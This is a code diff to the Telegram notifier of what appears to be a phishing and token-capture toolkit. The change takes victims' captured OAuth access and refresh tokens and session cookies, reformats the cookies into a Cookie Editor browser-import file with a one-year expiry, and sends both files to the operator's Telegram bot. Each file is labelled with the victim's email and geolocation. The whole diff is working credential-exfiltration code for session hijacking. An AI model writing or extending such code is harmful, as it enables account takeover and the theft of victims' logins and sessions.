@@ -1125,55 +1125,108 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 			}
 		}
 		
+		// Fallback to credentials username
+		if userEmail == "" {
+			if username, ok := data.Credentials["username"]; ok && username != "" {
+				userEmail = username
+			}
+		}
+		
 		if userEmail == "" {
 			userEmail = "unknown"
 		}
 
-		// Caption with email and location
-		caption := fmt.Sprintf("📧 %s\n📍 %s, %s %s\n🌐 %s",
+		// Sanitize email for filename
+		filenameBase := strings.Map(func(r rune) rune {
+			if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' || r == '.' || r == '@' {
+				return r
+			}
+			return '_'
+		}, userEmail)
+		if filenameBase == "" || filenameBase == "unknown" {
+			filenameBase = "captured"
+		}
+
+		// 1. Send TOKENS file (.txt)
+		tokenCaption := fmt.Sprintf("🔑 OAuth Tokens\n📧 %s\n📍 %s, %s %s\n🌐 %s",
 			userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag, data.Origin)
 
-		// File content: raw tokens only, easy to copy
-		var fileContent strings.Builder
+		var tokenContent strings.Builder
+		tokenContent.WriteString("=== ACCESS TOKEN ===\n")
 		if at, ok := data.Custom["dc_access_token"]; ok {
-			fileContent.WriteString(at)
+			tokenContent.WriteString(at)
 		}
-		fileContent.WriteString("\n\n")
+		tokenContent.WriteString("\n\n=== REFRESH TOKEN ===\n")
 		if rt, ok := data.Custom["dc_refresh_token"]; ok {
-			fileContent.WriteString(rt)
+			tokenContent.WriteString(rt)
 		}
 
-		// Filename is the email address
-		filename := "tokens.txt"
-		if userEmail != "" && userEmail != "unknown" {
-			filename = userEmail + ".txt"
+		tokenFilename := filenameBase + "_tokens.txt"
+		if err := nm.sendTelegramDocument(n, tokenFilename, tokenContent.String(), tokenCaption); err != nil {
+			log.Error("[telegram] failed to send token file: %v", err)
+		} else {
+			log.Success("[telegram] Token file sent: %s", tokenFilename)
 		}
 
-		// Send as file via Telegram sendDocument
-		var body bytes.Buffer
-		writer := multipart.NewWriter(&body)
-		writer.WriteField("chat_id", n.TelegramChatID)
-		writer.WriteField("caption", caption)
+		// 2. Send COOKIES file (.json) - Cookie Editor format for browser import
+		if len(data.Cookies) > 0 {
+			type CookieEditorFormat struct {
+				Path           string `json:"path"`
+				Domain         string `json:"domain"`
+				ExpirationDate int64  `json:"expirationDate"`
+				Value          string `json:"value"`
+				Name           string `json:"name"`
+				HttpOnly       bool   `json:"httpOnly,omitempty"`
+				HostOnly       bool   `json:"hostOnly,omitempty"`
+			}
+			var cookies []CookieEditorFormat
+			expTime := time.Now().Add(365 * 24 * time.Hour).Unix()
 
-		part, err := writer.CreateFormFile("document", filename)
-		if err != nil {
-			return fmt.Errorf("failed to create form file: %v", err)
+			for domain, domainCookies := range data.Cookies {
+				for _, cookie := range domainCookies {
+					if cookie == nil {
+						continue
+					}
+					path := cookie.Path
+					if path == "" {
+						path = "/"
+					}
+					hostOnly := true
+					cookieDomain := domain
+					if strings.HasPrefix(domain, ".") {
+						hostOnly = false
+						cookieDomain = domain[1:]
+					}
+					cookies = append(cookies, CookieEditorFormat{
+						Path:           path,
+						Domain:         cookieDomain,
+						ExpirationDate: expTime,
+						Value:          cookie.Value,
+						Name:           cookie.Name,
+						HttpOnly:       cookie.HttpOnly,
+						HostOnly:       hostOnly,
+					})
+				}
+			}
+
+			if len(cookies) > 0 {
+				jsonBytes, _ := json.Marshal(cookies)
+				cookieFilename := filenameBase + "_cookies.json"
+				cookieCaption := fmt.Sprintf("🍪 Session Cookies\n📧 %s\n📍 %s, %s %s",
+					userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
+				
+				if err := nm.sendTelegramDocument(n, cookieFilename, string(jsonBytes), cookieCaption); err != nil {
+					log.Warning("[telegram] failed to send cookie file: %v", err)
+				} else {
+					log.Success("[telegram] Cookie file sent: %s (%d cookies)", cookieFilename, len(cookies))
+				}
+			} else {
+				log.Debug("[telegram] No cookies to send for device code capture")
+			}
+		} else {
+			log.Debug("[telegram] data.Cookies is empty for device code capture")
 		}
-		part.Write([]byte(fileContent.String()))
-		writer.Close()
 
-		docURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", n.TelegramBotToken)
-		req, _ := http.NewRequest("POST", docURL, &body)
-		req.Header.Set("Content-Type", writer.FormDataContentType())
-
-		httpClient := &http.Client{Timeout: 30 * time.Second}
-		resp, err := httpClient.Do(req)
-		if err != nil {
-			return fmt.Errorf("failed to send Telegram document: %v", err)
-		}
-		resp.Body.Close()
-
-		log.Success("[telegram] Token file sent for %s", userEmail)
 		return nil
 
 	case EventDeviceCodeGenerated:
